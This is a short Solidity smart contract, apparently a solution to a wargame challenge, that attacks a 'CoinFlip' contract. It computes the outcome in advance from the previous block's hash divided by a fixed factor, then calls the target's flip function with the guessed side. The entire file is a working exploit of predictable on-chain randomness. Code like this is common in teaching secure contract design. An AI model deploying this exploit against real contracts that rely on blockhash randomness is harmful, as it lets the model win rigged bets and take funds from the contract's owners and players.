// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackCoinFlip {
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function attack() public {
        // Predict the correct side based on the previous block hash
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Call the flip function on the target contract directly using low-level call
        (bool success, ) = target.call(abi.encodeWithSignature("flip(bool)", side));
        require(success, "Call to CoinFlip contract failed");
    }
}
